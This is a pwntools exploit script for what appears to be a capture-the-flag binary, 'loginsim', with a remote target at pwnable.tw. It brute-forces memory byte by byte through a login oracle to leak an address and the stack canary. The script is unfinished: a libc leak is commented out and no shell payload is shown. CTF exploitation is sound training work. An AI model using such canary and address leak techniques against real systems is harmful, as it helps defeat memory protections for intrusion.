from pwn import *
from termcolor import colored

text = colored(' DEBUG ', 'red', attrs=['reverse', 'blink', 'bold'])
context.log_level = 'DEBUG'
DEBUG = 1
file = './loginsim'
exe  = ELF(file)

def register(io, username, length):
    success("=========================<REGISTER>=======================")
    io.sendlineafter(b"-> ", b"1")
    io.sendlineafter(b"{i} Username length: ", str(length).encode())
    io.sendafter(b"{i} Enter username: ", username)
    info("username:     %s"     %   username)
    info("length:       %d"     %   length)
    success("=========================</REGISTER>======================")

def login(io, username):
    success("=========================<LOGIN>=======================")
    io.sendlineafter(b"-> ", b"2")
    io.sendafter(b"{i} Username: ", username)
    info("username:     %s"     %   username)
    success("=========================</LOGIN>======================")
    recv = io.recvline()
    print("recv:        ", recv)
    if b"Good job!" in recv:
        return 1
    else:
        return 0
    

def brute_force_register(io, username, length):
    result = username
    payload = b""
    leaked = b""
    for i in range(length):
        register(io, result + b"\n", len(result) + 1)
        for b in range(0, 256, 1):
            payload = result + bytes([b]) + b"\n"
            info("Try %s"   %   payload)
            if login(io, payload) == 1:
                result = payload[:-1]
                leaked += bytes([b])
                print("Result:      %s"     %   leaked)
                if b == 0:
                    return leaked
                break

    return leaked

def main(io, libc=None):
    # declared
    # exploit
    username = b"A"*0x78
    result = brute_force_register(io, username, 8)
    __libc_csu_init = u64(result.ljust(8, b"\x00"))
    info("__libc_csu_init:      %#x"    %   __libc_csu_init)

    username = b"B"*0x99
    result = brute_force_register(io, username, 7)
    canary = u64(result.ljust(8, b"\x00"))
    info("canary:      %#x"    %   canary)

    # username = b"C"*0xa8
    # result = brute_force_register(io, username, 8)
    # __libc_start_main = u64(result.ljust(8, b"\x00")) - 243
    # info("__libc_start_main:      %#x"    %   __libc_start_main)

if __name__ == '__main__':
    if DEBUG:
        libc = ELF('glibc/libc.so.6')
        #env = {'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
        #io = process([os.path.join(os.getcwd(), 'ld-linux.so.2'), file], env=env)
        io = process(file)
        input(text)
    else:
        libc = ELF('./libc.so.6')
        io = remote('chall.pwnable.tw', 1337)
    
    main(io, libc)
    io.interactive()